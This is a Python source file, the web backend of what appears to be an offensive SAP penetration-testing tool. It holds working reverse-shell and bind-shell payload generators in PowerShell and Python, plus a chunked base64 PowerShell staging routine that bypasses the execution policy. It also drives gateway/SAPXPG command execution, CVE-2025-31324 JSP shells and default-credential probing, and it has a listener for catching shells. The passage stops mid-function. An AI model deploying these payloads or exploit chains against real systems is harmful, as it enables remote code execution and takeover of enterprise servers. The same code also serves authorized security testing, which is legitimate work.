#!/usr/bin/env python3
"""
SAPMAP GUI Backend — Bottle HTTP server providing REST API for the frontend.

Mirrors the SAPology_gui.py architecture: Bottle + pywebview (or browser).
All operations run in background threads; JS polls for state updates.
"""

import io
import json
import os
import sys
import threading
import time
from datetime import datetime

from bottle import Bottle, BaseRequest, request, response, static_file

BaseRequest.MEMFILE_MAX = 512 * 1024 * 1024

from sapmap_models import (SAPMAPState, SAPNode, InstanceInfo, RFCConnection,
                           Credentials, CreatedUser)
from sapmap_html import get_html
import sapmap_scanner
import sapmap_rfc
import sapmap_exploit
import sapmap_cleanup
import sapmap_secstore
import sapmap_state as state_mgr
import sapmap_findings

def _derive_sid(destination_name: str, host: str) -> str:
    """Derive a SID from an RFC destination name or hostname.

    Common patterns: DEST_SID, SID_DEST, PREFIX_SID_SUFFIX.
    Falls back to first 3 chars of hostname uppercased.
    """
    import re
    name = destination_name.upper().strip()
    # Try to extract a 3-char alphanumeric segment that looks like a SID
    # Skip common prefixes: SAP, RFC, SM_, SAPMAP_, SAPHOUND_
    cleaned = re.sub(r'^(SAPMAP_|SAPHOUND_|SAP_|RFC_|SM_)', '', name)
    parts = re.split(r'[_\-]', cleaned)
    skip = {'TO', 'IN', 'OF', 'ON', 'AT', 'BY', 'CLNT', 'DEST',
            'CONN', 'TEST', 'PROD', 'DEV', 'QAS'}
    # Prefer 3-char segments first
    for p in parts:
        p = p.strip()
        if len(p) == 3 and p.isalnum() and not p.isdigit() and p not in skip:
            return p
    for p in parts:
        p = p.strip()
        if 2 <= len(p) <= 4 and p.isalnum() and not p.isdigit() and p not in skip:
            return p[:3]
    # Try to extract a 3-char SID from longer segments (e.g. S4HCLNT001)
    for p in parts:
        p = p.strip()
        if len(p) > 4:
            candidate = p[:3]
            if candidate.isalnum() and not candidate.isdigit():
                return candidate
    # Fallback: use host
    h = host.upper().replace('.', '_').replace('-', '_')
    parts = h.split('_')
    for p in parts:
        if 2 <= len(p) <= 4 and p.isalnum() and not p.isdigit():
            return p[:3]
    return h[:3] if len(h) >= 3 else "UNK"


def _resolve_host(host: str) -> str:
    """Resolve a hostname to an IP address. Returns '' on failure."""
    import socket
    # If it already looks like an IP, return as-is
    try:
        socket.inet_aton(host)
        return host
    except socket.error:
        pass
    try:
        return socket.gethostbyname(host)
    except socket.gaierror:
        return ""


# ===========================================================================
# Console line buffer (same pattern as SAPology GUI)
# ===========================================================================

_console_lines = []
_console_lock = threading.Lock()

_ui_commands = []
_ui_cmd_lock = threading.Lock()


def ui_command(cmd: str, **kwargs):
    """Queue a command for the frontend to execute on its next poll."""
    with _ui_cmd_lock:
        _ui_commands.append({"cmd": cmd, **kwargs})


def _add_console_line(ts, text, css_class="cl-info"):
    with _console_lock:
        _console_lines.append({"ts": ts, "text": text, "cls": css_class})


# ---- Wire findings → console: every emit_finding() also shows up in the
# console pane with severity-specific styling, so nothing is ever hidden.
_SEV_TO_CSS = {
    "CRITICAL": "cl-crit",
    "HIGH":     "cl-warn",
    "MEDIUM":   "cl-warn",
    "INFO":     "cl-ok",
}


def _console_push_finding(record: dict) -> None:
    sev   = record.get("severity", "INFO")
    node  = record.get("node", "?")
    msg   = record.get("msg", "")
    cve   = record.get("cve", "")
    text  = f"[{sev}] {node} — {msg}"
    if cve:
        text += f"  ({cve})"
    escaped = (text
               .replace("&", "&amp;")
               .replace("<", "&lt;")
               .replace(">", "&gt;"))
    ts = datetime.now().strftime("%H:%M:%S")
    _add_console_line(ts, escaped, _SEV_TO_CSS.get(sev, "cl-info"))


sapmap_findings.register_listener(_console_push_finding)


class OutputCapture(io.TextIOBase):
    """Intercept stdout and push lines to the shared console buffer."""

    def __init__(self, original_stdout):
        self.original = original_stdout
        self.buffer = ""
        self.lock = threading.Lock()

    def write(self, text):
        if self.original:
            try:
                self.original.write(text)
            except Exception:
                pass

        with self.lock:
            self.buffer += text
            while "\r" in self.buffer and "\n" not in self.buffer:
                idx = self.buffer.rfind("\r")
                self.buffer = self.buffer[idx + 1:]
            while "\n" in self.buffer:
                line, self.buffer = self.buffer.split("\n", 1)
                line = line.rstrip("\r")
                if line.strip():
                    self._push_line(line)
        return len(text)

    def _push_line(self, line):
        css_class = "cl-info"
        if line.lstrip().startswith("[+]") or "detected" in line.lower():
            css_class = "cl-ok"
        elif line.lstrip().startswith("[-]") or "error" in line.lower():
            css_class = "cl-err"
        elif line.lstrip().startswith("[!]"):
            css_class = "cl-warn"
        elif line.lstrip().startswith("[*]"):
            css_class = "cl-info"
        elif "CRITICAL" in line or "SAP_ALL" in line:
            css_class = "cl-crit"
        elif line.lstrip().startswith("===") or line.lstrip().startswith("---"):
            css_class = "cl-dim"

        escaped = (line
                   .replace("&", "&amp;")
                   .replace("<", "&lt;")
                   .replace(">", "&gt;"))

        ts = datetime.now().strftime("%H:%M:%S")
        _add_console_line(ts, escaped, css_class)

    def flush(self):
        with self.lock:
            stripped = self.buffer.strip().rstrip("\r")
            if stripped:
                self._push_line(stripped)
                self.buffer = ""
        if self.original:
            try:
                self.original.flush()
            except Exception:
                pass

    def isatty(self):
        return False


# ===========================================================================
# Active-task tracker (thread-safe)
# ===========================================================================

_active_tasks = {}          # key → description, e.g. "NPL:rfc_system_info" → "RFC System Info"
_active_tasks_lock = threading.Lock()

# Stop-events for cancellable long-running operations (e.g. 10KBlaze betrusted,
# which can otherwise block for up to 25 minutes waiting for the MS propagation
# cycle).  The STOP button signals every event registered here.
_betrusted_stops = {}       # key → threading.Event
_betrusted_stops_lock = threading.Lock()


def _task_start(key: str, label: str = ""):
    with _active_tasks_lock:
        _active_tasks[key] = label or key


def _task_end(key: str):
    with _active_tasks_lock:
        _active_tasks.pop(key, None)


def _get_active_tasks() -> dict:
    with _active_tasks_lock:
        return dict(_active_tasks)


def _register_betrusted_stop(key: str, event: threading.Event):
    with _betrusted_stops_lock:
        _betrusted_stops[key] = event


def _unregister_betrusted_stop(key: str):
    with _betrusted_stops_lock:
        _betrusted_stops.pop(key, None)


def _signal_all_betrusted_stops() -> int:
    """Signal every registered betrusted stop_event. Returns count signalled."""
    with _betrusted_stops_lock:
        events = list(_betrusted_stops.items())
    for _, ev in events:
        try:
            ev.set()
        except Exception:
            pass
    return len(events)


def _bg(key: str, label: str, fn):
    """Launch *fn* in a daemon thread with task tracking.

    Each freshly-launched task implicitly clears the global stop
    flag so a prior STOP press doesn't silently cancel new work.
    Cancellation only affects work already in flight.
    """
    import sapmap_stop
    sapmap_stop.reset_stop()
    def _wrapper():
        _task_start(key, label)
        try:
            fn()
        finally:
            _task_end(key)
    threading.Thread(target=_wrapper, daemon=True).start()


# ===========================================================================
# Reverse Shell Session
# ===========================================================================

import socket as _socket_mod

_shell_session = None
_shell_lock = threading.Lock()


class ShellSession:
    """Manages a single reverse shell TCP connection."""

    def __init__(self, port: int, target_sid: str, mode: str = "reverse"):
        self.port = port
        self.target_sid = target_sid
        self.mode = mode           # "reverse" or "bind"
        self.status = "idle"       # idle/waiting/connected/disconnected/error
        self.error_msg = ""
        self.progress_msg = ""     # transient progress info for UI
        self.cancelled = False     # set True to abort _send thread
        self.server_sock = None
        self.client_sock = None
        self.client_addr = None
        self.target_host = ""      # for bind mode: target IP to connect to
        self.output_buffer = []
        self.output_lock = threading.Lock()

    def start_listener(self):
        """Bind TCP listener and wait for reverse shell connection."""
        try:
            self.server_sock = _socket_mod.socket(
                _socket_mod.AF_INET, _socket_mod.SOCK_STREAM)
            self.server_sock.setsockopt(
                _socket_mod.SOL_SOCKET, _socket_mod.SO_REUSEADDR, 1)
            self.server_sock.bind(("0.0.0.0", self.port))
            self.server_sock.listen(1)
            self.status = "waiting"
            threading.Thread(target=self._listener_loop, daemon=True).start()
        except OSError as e:
            self.status = "error"
            self.error_msg = f"Cannot bind port {self.port}: {e}"

    def _listener_loop(self):
        try:
            self.server_sock.settimeout(120)
            self.client_sock, self.client_addr = self.server_sock.accept()
            self.client_sock.settimeout(None)  # blocking for reader
            self.status = "connected"
            self.server_sock.close()
            self.server_sock = None
            threading.Thread(target=self._reader_loop, daemon=True).start()
        except _socket_mod.timeout:
            self.status = "error"
            self.error_msg = "Timeout — no reverse shell connection received"
            self._close_server()
        except Exception as e:
            self.status = "error"
            self.error_msg = str(e)
            self._close_server()

    def start_connector(self, target_host: str, saprouter: str = ""):
        """Connect TO a bind shell on the target (bind mode)."""
        self.target_host = target_host
        self.status = "waiting"
        threading.Thread(
            target=self._connector_loop,
            args=(target_host, saprouter),
            daemon=True).start()

    def _connector_loop(self, target_host, saprouter):
        """Try to connect to the bind shell with retries."""
        import time
        for attempt in range(30):  # retry for 30 seconds
            if self.status != "waiting":
                return
            try:
                if saprouter:
                    from sap_saprouter import (connect_through_saprouter,
                                               build_route_for_port)
                    route = build_route_for_port(
                        saprouter, target_host, self.port)
                    self.client_sock = connect_through_saprouter(
                        route, timeout=5, talk_mode=1)  # raw TCP for shell
                else:
                    self.client_sock = _socket_mod.socket(
                        _socket_mod.AF_INET, _socket_mod.SOCK_STREAM)
                    self.client_sock.settimeout(5)
                    self.client_sock.connect((target_host, self.port))
                self.client_sock.settimeout(None)  # blocking for reader
                self.client_addr = (target_host, self.port)
                self.status = "connected"
                print(f"[+] Bind shell connected to "
                      f"{target_host}:{self.port}")
                threading.Thread(
                    target=self._reader_loop, daemon=True).start()
                return
            except Exception as e:
                print(f"[*] Bind shell connect attempt {attempt+1}/30 "
                      f"to {target_host}:{self.port}: {e}")
                time.sleep(1)
        self.status = "error"
        self.error_msg = (f"Could not connect to bind shell at "
                          f"{target_host}:{self.port} after 30 attempts")

    def _reader_loop(self):
        try:
            while self.status == "connected":
                data = self.client_sock.recv(4096)
                if not data:
                    self.status = "disconnected"
                    break
                with self.output_lock:
                    self.output_buffer.append(
                        data.decode("utf-8", errors="replace"))
        except Exception:
            if self.status == "connected":
                self.status = "disconnected"

    def send_input(self, text: str):
        if self.status == "connected" and self.client_sock:
            try:
                self.client_sock.sendall((text + "\n").encode())
            except Exception:
                self.status = "disconnected"

    def get_output(self) -> str:
        with self.output_lock:
            out = "".join(self.output_buffer)
            self.output_buffer.clear()
            return out

    def stop(self):
        self.status = "disconnected"
        self.cancelled = True
        self._close_client()
        self._close_server()

    def _close_server(self):
        if self.server_sock:
            try:
                self.server_sock.close()
            except Exception:
                pass
            self.server_sock = None

    def _close_client(self):
        if self.client_sock:
            try:
                self.client_sock.close()
            except Exception:
                pass
            self.client_sock = None


def _detect_local_ip(target_host: str, saprouter: str = "") -> str:
    """Detect which local IP can reach the target (or SAProuter first hop)."""
    # For SAProuter, we need to reach the router, not the final target
    reach_host = target_host
    if saprouter:
        try:
            from sap_saprouter import parse_route_string
            hops = parse_route_string(saprouter + f"/H/{target_host}/S/3200")
            reach_host = hops[0]["host"]
        except Exception:
            pass
    try:
        s = _socket_mod.socket(_socket_mod.AF_INET, _socket_mod.SOCK_DGRAM)
        s.connect((reach_host, 1))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception:
        return "127.0.0.1"


def _win_multistep_payload(ps_script: str, display: str) -> dict:
    """Build a multi-step Windows payload: write PS script to temp file,
    then execute it.

    EXTPROG is only 128 bytes in the SAPXPG protocol. PowerShell
    EncodedCommand payloads are ~1100 chars, so they get truncated.
    Instead, write the Base64-encoded script to a temp file in chunks
    via multiple 'cmd.exe /C echo ... >> file' calls, then run
    PowerShell to decode and execute from that file.

    GW path — each step dict has three keys:
      "command"     → EXTPROG (≤128 bytes, the executable only: "cmd.exe")
      "params"      → PARAMS  (≤255 bytes, arguments: "/C echo ...")
      "long_params" → "" to prevent old-kernel PARAMS+LONG_PARAMS concatenation
                      (kernel 700/742 appends LONG_PARAMS to PARAMS if non-empty)

    Returns a dict with "steps" (list of command/params dicts) and
    a final "command"/"params"/"long_params" that is the execute step.
    """
    import base64
    # Use %TEMP% (cmd.exe env-var) / $env:TEMP (PowerShell) so the path
    # resolves correctly on every Windows SAP system.  SAP sets %TEMP% to the
    # instance work/tmp directory (e.g. P:\usr\sap\TWT\tmp on TWT), which the
    # SAP service user always owns — unlike C:\Windows\Temp, which may have
    # restricted ACLs or trigger AV on first access.
    #
    # Keep filename short ("s") — the SXPG -e base64 has a 255-byte PARAMS
    # limit and every extra char in the decode_script costs ~2 base64 chars.
    tmp_cmd = r"%TEMP%\s"       # expanded by cmd.exe at runtime
    # For PowerShell, use a double-quoted string so $env:TEMP expands:
    #   gc "$env:TEMP\s"
    # Note: \" inside the outer "-quoted -c argument is a literal double-quote
    # via CommandLineToArgvW parsing.
    tmp_ps  = r"$env:TEMP\s"   # expanded by PowerShell at runtime

    # GW path: UTF-16LE Base64 (for PowerShell Unicode.GetString decode)
    enc_u16 = base64.b64encode(
        ps_script.encode("utf-16-le")).decode("ascii")
    chunk_size = 80
    gw_chunks = [enc_u16[i:i+chunk_size]
                 for i in range(0, len(enc_u16), chunk_size)]
    # Split every step into EXTPROG ("command") + PARAMS ("params").
    # Previously the full "cmd.exe /C echo ..." was put in "command" (EXTPROG),
    # which caused SAPXPG to call CreateProcess with the whole string as the
    # executable path → ERROR_INVALID_HANDLE (6) / WaitForSingleObject failure.
    # long_params="" prevents old kernels from appending LONG_PARAMS to PARAMS.
    steps = [
        # Clean up old file first (suppress "not found" errors)
        {"command": "cmd.exe",
         "params": "/C del /q %TEMP%\\s 2>nul",
         "long_params": ""},
    ]
    for idx, chunk in enumerate(gw_chunks):
        redir = ">" if idx == 0 else ">>"
        steps.append({
            "command": "cmd.exe",
            "params": f"/C echo {chunk}{redir}{tmp_cmd}",
            "long_params": "",
        })
    run_cmd_prog   = "powershell"
    # Read temp file via $env:TEMP (expands at runtime in PowerShell).
    # -replace removes any residual whitespace (e.g. trailing \r on some
    # Windows versions) before base64 decoding.
    # Inner \" are literal double-quotes via CommandLineToArgvW parsing.
    run_cmd_params = ("-nop -c \"$b=((gc \\\"" + tmp_ps + "\\\")"
                      "-join'')-replace'\\s','';iex([Text.Encoding]::"
                      "Unicode.GetString([Convert]::FromBase64String($b)))\"")
    assert len(run_cmd_prog)   <= 128, f"Execute EXTPROG too long: {run_cmd_prog!r}"
    assert len(run_cmd_params) <= 255, f"Execute PARAMS too long: {len(run_cmd_params)}"

    # SXPG path: write ASCII Base64 chunks to %TEMP%\s, decode to %TEMP%\s.ps1
    # then launch via "cmd.exe /C start /B powershell.exe -nop -File %TEMP%\s.ps1".
    #
    # The critical difference from the GW path: SXPG_STEP_XPG_START is a
    # *synchronous* RFC call — it blocks until the child process exits.
    # A bind shell (or any long-lived reverse shell) would deadlock because:
    #   - SXPG blocks on powershell.exe (waiting for AcceptTcpClient/session end)
    #   - start_connector is only called AFTER execute_local_command returns
    # Solution: launch PowerShell detached via "cmd.exe /C start /B ...".
    # cmd.exe exits immediately after spawning powershell, SXPG returns,
    # start_connector runs and connects to the waiting bind shell.
    sxpg_tmp_cmd = r"%TEMP%\s"       # cmd.exe path — expanded by cmd.exe
    sxpg_tmp_ps  = r"$env:TEMP\s"    # PowerShell path — expanded by PS
    sxpg_ps1_ps  = r"$env:TEMP\s.ps1"  # decoded script file (PS path)
    enc_ascii = base64.b64encode(
        ps_script.encode("ascii")).decode("ascii")
    sxpg_chunks = [enc_ascii[i:i+chunk_size]
                   for i in range(0, len(enc_ascii), chunk_size)]
    # Decode step: decode base64 from %TEMP%\s → write PS script to %TEMP%\s.ps1
    # Paths use double-quoted PS strings so $env:TEMP expands at runtime.
    # Inner \" are literal double-quotes via CommandLineToArgvW.
    sxpg_decode_params = ("-nop -c \"[IO.File]::WriteAllText("
                          "\\\"" + sxpg_ps1_ps + "\\\","
                          "[Text.Encoding]::ASCII.GetString("
                          "[Convert]::FromBase64String("
                          "-join(gc \\\"" + sxpg_tmp_ps + "\\\"))))\"")
    # Final execute step: launch .ps1 detached so cmd.exe (and SXPG) return
    # immediately without waiting for the shell session to end.
    # -ep bypass overrides the execution policy (Restricted by default on
    # Windows Server 2008 R2) which would otherwise block loading .ps1 files.
    # Inline -c commands are never blocked, only -File; so only this step needs it.
    sxpg_final_params = "/C start /B powershell.exe -nop -ep bypass -File %TEMP%\\s.ps1"
    assert len(sxpg_decode_params) <= 255, (
        f"SXPG decode params too long: {len(sxpg_decode_params)}")
    assert len(sxpg_final_params)  <= 255, (
        f"SXPG final params too long: {len(sxpg_final_params)}")

    sxpg_steps = [
        # Clean up old intermediate and script files
        {"command": "cmd.exe",
         "params": "/C del /q %TEMP%\\s %TEMP%\\s.ps1 2>nul"},
    ]
    for idx, chunk in enumerate(sxpg_chunks):
        redir = ">" if idx == 0 else ">>"
        sxpg_steps.append({
            "command": "cmd.exe",
            "params": f"/C echo {chunk}{redir}{sxpg_tmp_cmd}",
        })
    # Decode the base64 file into a .ps1 script file
    sxpg_steps.append({"command": "powershell.exe",
                        "params": sxpg_decode_params})
    return {
        "steps": steps,
        "command": run_cmd_prog,
        "params": run_cmd_params,
        "long_params": "",          # prevent PARAMS+LONG_PARAMS concat on old kernels
        "sxpg_steps": sxpg_steps,
        "sxpg_command": "cmd.exe",          # detached launch via start /B
        "sxpg_params": sxpg_final_params,
        # Raw PowerShell source — for backends (CVE-2025-31324 via JSP shell)
        # that don't have the 128/255-byte EXTPROG/PARAMS limits and can run
        # the script directly in one shot, skipping the chunked base64 write.
        "raw_ps_script": ps_script,
        "display": display,
    }


def _detect_is_windows(node, method: str = "sxpg") -> bool:
    """Probe the target to determine whether it is Windows when os_type is unknown.

    Runs ``cmd.exe /C echo __SAPMAP_WIN__`` via SXPG or GW.  If cmd.exe
    succeeds and echoes the token back, the target is Windows.  Result is
    cached on ``node.os_type`` so subsequent calls skip the probe.

    Returns True if Windows, False otherwise.
    """
    cached = (node.os_type or "").lower()
    if cached:
        return any(w in cached for w in ("windows", "nt", "win"))

    probe_token = "__SAPMAP_WIN__"
    try:
        if method == "gateway" and node.gw_vulnerable:
            r = sapmap_exploit.execute_gw_command(
                node, "cmd.exe", f"/C echo {probe_token}")
        elif method == "cve_31324" and node.cve_2025_31324_vulnerable:
            # Route through the dropped JSP if available (output capture),
            # otherwise fire the blind Runtime.exec gadget — in the latter
            # case we can't read the echo back, so assume Windows (SAP Java
            # deployments on Linux are rare and the caller can correct the
            # OS type via "Set OS Type").
            r = sapmap_exploit.execute_cve_2025_31324_via_shell(
                node, f"cmd.exe /C echo {probe_token}")
            if not (node.cve_2025_31324_shells):
                # Blind exec — no output to match; assume Windows.
                node.os_type = "Windows"
                return True
        else:
            creds = node.best_credentials()
            if not creds:
                return False
            r = sapmap_rfc.execute_local_command(
                node, "cmd.exe", f"/C echo {probe_token}", creds)
        if r.get("success") and any(
                probe_token in line for line in r.get("output", [])):
            node.os_type = "Windows"   # cache so we don't probe again
            return True
    except Exception:
        pass
    return False


def _detect_python_cmd(node) -> str:
    """Detect whether the target has python3 or python (2.x).
    Caches result on node._python_cmd.
    """
    cached = getattr(node, "_python_cmd", None)
    if cached:
        return cached
    # Try python3 first via a quick GW or SXPG probe
    for cmd in ("python3", "python"):
        try:
            if node.gw_vulnerable:
                result = sapmap_exploit.execute_gw_command(
                    node, cmd, "--version")
            else:
                creds = node.best_credentials()
                if creds:
                    result = sapmap_rfc.execute_local_command(
                        node, cmd, "--version", creds)
                else:
                    continue
            if result.get("success"):
                # Check output for errors — SAPXPG returns success
                # even when the program doesn't exist
                out = " ".join(result.get("output", [])).lower()
                if ("no such file" in out or "not found" in out
                        or "not recognized" in out
                        or "exit code 1" in out):
                    continue
                node._python_cmd = cmd
                print(f"[*] {node.sid}: Detected {cmd}")
                return cmd
        except Exception:
            pass
    # Default to python3
    node._python_cmd = "python3"
    return "python3"


def _generate_payload(os_type: str, ip: str, port: int,
                      python_cmd: str = "python3") -> dict:
    """Generate reverse shell payload based on OS type."""
    is_win = any(w in (os_type or "").lower() for w in ("windows", "nt", "win"))
    if is_win:
        ps = (f"$c=New-Object Net.Sockets.TCPClient('{ip}',{port});"
              f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
              f"while(($i=$s.Read($b,0,$b.Length))-ne 0){{"
              f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
              f"$r=(iex $d 2>&1|Out-String);"
              f"$p=$r+'PS '+$(pwd).Path+'> ';"
              f"$t=([text.encoding]::ASCII).GetBytes($p);"
              f"$s.Write($t,0,$t.Length);$s.Flush()}};$c.Close()")
        return _win_multistep_payload(ps, f"PowerShell reverse shell → {ip}:{port}")
    else:
        # SAPXPG splits PARAMS at spaces (execvp argv splitting).
        # With EXTPROG=python3 and PARAMS="-c <code>", SAPXPG produces
        # ["python3", "-c", "<code>"] which is correct — python3 gets
        # -c as flag and the code as a single argument.
        #
        # The code MUST have ZERO spaces. Use __import__() instead of
        # bare "import" statements, and semicolons for multi-statements.
        py_code = (
            f"s=__import__('socket').socket(2,1);"
            f"s.connect(('{ip}',{port}));"
            f"__import__('os').dup2(s.fileno(),0);"
            f"__import__('os').dup2(s.fileno(),1);"
            f"__import__('os').dup2(s.fileno(),2);"
            f"__import__('subprocess').call(['/bin/bash','-i'])"
        )
        assert " " not in py_code, f"Space in payload: {py_code}"
        return {
            "command": python_cmd,
            "params": f"-c {py_code}",
            "display": f"{python_cmd} reverse shell → {ip}:{port}",
        }


def _generate_bind_payload(os_type: str, port: int,
                           python_cmd: str = "python3") -> dict:
    """Generate bind shell payload — opens a listening port on the target."""
    is_win = any(w in (os_type or "").lower() for w in ("windows", "nt", "win"))
    if is_win:
        ps = (f"$l=New-Object Net.Sockets.TcpListener([Net.IPAddress]::Any,{port});"
              f"$l.Start();"
              f"$c=$l.AcceptTcpClient();"
              f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
              f"while(($i=$s.Read($b,0,$b.Length))-ne 0){{"
              f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
              f"$r=(iex $d 2>&1|Out-String);"
              f"$p=$r+'PS '+$(pwd).Path+'> ';"
              f"$t=([text.encoding]::ASCII).GetBytes($p);"
              f"$s.Write($t,0,$t.Length);$s.Flush()}};$c.Close();$l.Stop()")
        return _win_multistep_payload(ps, f"PowerShell bind shell on port {port}")
    else:
        # Bind shell: listen on target, SAPMAP connects to it.
        # Zero spaces, under 255 chars (SXPG PARAMS limit).
        # Use short aliases: o=os, d=dup2, f=fileno
        py_code = (
            f"import(socket,os,subprocess);"  # dummy — replaced below
        )
        # Build compact code under 250 chars.
        # CRITICAL: must fork() so the bind shell survives after
        # SAPXPG/GW connection closes (P4 timeout kills the process).
        # Close fd 1+2 after fork so SXPG's stdout pipe gets EOF
        # and the RFC call returns (otherwise SXPG blocks forever).
        py_code = (
            f"o=__import__('os');"
            f"o.fork()and(o._exit(0));"
            f"o.close(1);o.close(2);"
            f"s=__import__('socket').socket(2,1);"
            f"s.setsockopt(1,2,1);"
            f"s.bind(('',{port}));"
            f"s.listen(1);"
            f"c,a=s.accept();"
            f"[o.dup2(c.fileno(),i)for(i)in(0,1,2)];"
            f"o.execv('/bin/bash',['/bin/bash','-i'])"
        )
        assert " " not in py_code, f"Space in bind payload: {py_code}"
        assert len(py_code) < 252, f"Bind payload too long: {len(py_code)} chars"
        return {
            "command": python_cmd,
            "params": f"-c {py_code}",
            "display": f"{python_cmd} bind shell on target port {port}",
        }


# ===========================================================================
# SAPMAPApi — Backend controller
# ===========================================================================

class SAPMAPApi:
    """Backend controller for SAPMAP operations."""

    def __init__(self):
        self.state = SAPMAPState()
        self.scan_thread = None
        self.scan_running = False
        self.scan_cancelled = False
        self.cancel_event = threading.Event()
        self.scan_state = "idle"  # idle, running, complete, cancelled, error
        self.scan_error = ""
        self.operation_lock = threading.Lock()

    def start_scan(self, config):
        if self.scan_running:
            return {"error": "Scan already running"}

        self.scan_running = True
        self.scan_cancelled = False
        self.cancel_event.clear()
        # Clear the global stop flag too so a previous STOP doesn't
        # immediately cancel the new scan.
        import sapmap_stop
        sapmap_stop.reset_stop()
        self.scan_state = "running"
        self.scan_error = ""

        # Clear console and findings buffer
        global _console_lines
        with _console_lock:
            _console_lines = []
        sapmap_findings.clear()

        targets_str = config.get("targets", "").strip()
        scan_label = f"Scan on target {targets_str}" if targets_str else "Network Scan"

        def _scan_fn():
            _task_start("_scan", scan_label)
            try:
                self._run_scan(config)
            finally:
                _task_end("_scan")
        self.scan_thread = threading.Thread(target=_scan_fn, daemon=True)
        self.scan_thread.start()
        return {"status": "started"}

    def _run_scan(self, config):
        try:
            targets_str = config.get("targets", "")
            inst_from = config.get("inst_from", 0)
            inst_to = config.get("inst_to", 99)
            threads = config.get("threads", 30)
            timeout = config.get("timeout", 3)
            fast_mode = config.get("fast_mode", True)

            # Advanced scan parameters
            concurrent_hosts = config.get("concurrent_hosts", 5)
            port_timeout = config.get("port_timeout", 3.0)
            alive_timeout = config.get("alive_timeout", 0.5)
            skip_alive = config.get("skip_alive", False)
            scc_probe_default_creds = bool(config.get("scc_probe_default_creds", False))

            # Pass advanced params via module-level config
            sapmap_scanner.ALIVE_TIMEOUT = alive_timeout

            targets = sapmap_scanner.parse_targets(targets_str)
            if not targets:
                print("[-] No valid targets found")
                self.scan_state = "error"
                self.scan_error = "No valid targets"
                self.scan_running = False
                return

            self.state.scan_config = config

            nodes = sapmap_scanner.discover_systems(
                targets,
                instance_range=(inst_from, inst_to),
                timeout=timeout,
                threads=threads,
                fast_mode=fast_mode,
                cancel_event=self.cancel_event,
                verbose=True,
                skip_alive=skip_alive,
                concurrent_hosts=concurrent_hosts,
                port_timeout=port_timeout,
                node_callback=lambda node: self.state.add_node(node),
                scc_callback=lambda scc: self.state.scc_nodes.update({scc.host: scc}),
                scc_probe_default_creds=scc_probe_default_creds,
            )

            # Add any nodes that weren't already added via callback (e.g. deep mode)
            for node in nodes:
                if node.sid not in self.state.nodes:
                    self.state.add_node(node)

            if self.cancel_event.is_set():
                self.scan_state = "cancelled"
            else:
                self.scan_state = "complete"

        except Exception as e:
            self.scan_state = "error"
            self.scan_error = str(e)
            print(f"[-] Scan error: {e}")
        finally:
            self.scan_running = False

    def stop_scan(self):
        # Three layers — older callers + new global poll:
        #  1. scanner.cancel_event (existing) — affects the scan loop
        #  2. registered betrusted stop_events (existing) — 10KBlaze
        #  3. process-wide sapmap_stop.request_stop() (new) — every
        #     long-running background op (RFC bulk tests, secstore
        #     extract, JSP deploy chunked upload, propagation chains)
        #     can poll is_stop_requested() and bail at a safe point
        self.cancel_event.set()
        self.scan_cancelled = True
        import sapmap_stop
        sapmap_stop.request_stop()
        n_bet = _signal_all_betrusted_stops()
        n_active = len(_get_active_tasks())
        msg_parts = ["[!] STOP requested"]
        msg_parts.append(f"scan cancel-event set")
        if n_bet:
            msg_parts.append(f"{n_bet} 10KBlaze betrusted run(s) signalled")
        if n_active:
            msg_parts.append(f"{n_active} active background task(s) "
                              f"flagged via sapmap_stop")
        print(" — ".join(msg_parts))
        return {"status": "stopping",
                "betrusted_cancelled": n_bet,
                "active_tasks_flagged": n_active}

    def get_state_dict(self):
        """Get current state as a dict for the frontend."""
        d = self.state.to_dict()
        d["scan_state"] = self.scan_state
        d["scan_error"] = self.scan_error
        d["stats"] = self.state.stats()
        d["active_tasks"] = _get_active_tasks()
        return d


# ===========================================================================
# Bottle app with routes
# ===========================================================================

def create_app(api: SAPMAPApi) -> Bottle:
    app = Bottle()

    # -- Serve the SPA --
    @app.route("/")
    def index():
        response.content_type = "text/html; charset=utf-8"
        response.set_header("Cache-Control", "no-cache, no-store, must-revalidate")
        return get_html()

    # -- Favicon --
    @app.route("/favicon.ico")
    def favicon():
        icons_dir = os.path.join(os.path.dirname(__file__), "icons")
        return static_file("sapmap.ico", root=icons_dir)

    # -- Console polling --
    @app.route("/api/console")
    def get_console():
        response.content_type = "application/json"
        cursor = int(request.params.get("cursor", 0))
        with _console_lock:
            # Reset cursor if buffer was cleared (new scan started)
            if cursor > len(_console_lines):
                cursor = 0
            lines = _console_lines[cursor:]
            new_cursor = len(_console_lines)
        return json.dumps({"lines": lines, "cursor": new_cursor})

    # -- Findings polling (critical-finding banner + drawer) --
    @app.route("/api/findings")
    def get_findings():
        response.content_type = "application/json"
        try:
            cursor = int(request.params.get("cursor", 0))
        except (TypeError, ValueError):
            cursor = 0
        return json.dumps(sapmap_findings.get_since(cursor))

    @app.route("/api/findings/clear", method="POST")
    def clear_findings():
        response.content_type = "application/json"
        sapmap_findings.clear()
        return json.dumps({"status": "ok"})

    # -- UI commands (script → frontend) --
    @app.route("/api/ui/commands")
    def get_ui_commands():
        response.content_type = "application/json"
        with _ui_cmd_lock:
            cmds = list(_ui_commands)
            _ui_commands.clear()
        return json.dumps(cmds)

    # -- State --
    @app.route("/api/state")
    def get_state():
        response.content_type = "application/json"
        return json.dumps(api.get_state_dict(), default=str)

    # -- Scan control --
    @app.route("/api/scan/start", method="POST")
    def scan_start():
        response.content_type = "application/json"
        config = request.json or {}
        return json.dumps(api.start_scan(config))

    @app.route("/api/scan/stop", method="POST")
    def scan_stop():
        response.content_type = "application/json"
        return json.dumps(api.stop_scan())

    # -- SCC (Cloud Connector) on-demand actions --
    @app.route("/api/scc/<host>/probe_creds", method="POST")
    def scc_probe_creds(host):
        response.content_type = "application/json"
        sn = api.state.scc_nodes.get(host)
        if not sn:
            return json.dumps({"error": f"SCC node {host} not found"})

        def _run():
            _task_start(f"scc:{host}:probe_creds", f"SCC {host}: probing default creds")
            try:
                from sapmap_scc_admin import probe_default_creds, logout
                live, sess, attempts = probe_default_creds(
                    host, port=sn.admin_ui_port or 8443, timeout=8.0,
                )
                if live and sess:
                    sn.default_creds_live = True
                    sn.admin_session_obtained = True
                    sn.pwned = True
                    if sess.version:
                        sn.version = sess.version
                        sn.version_source = "api"
                    sapmap_findings.emit_finding(
                        "CRITICAL", host,
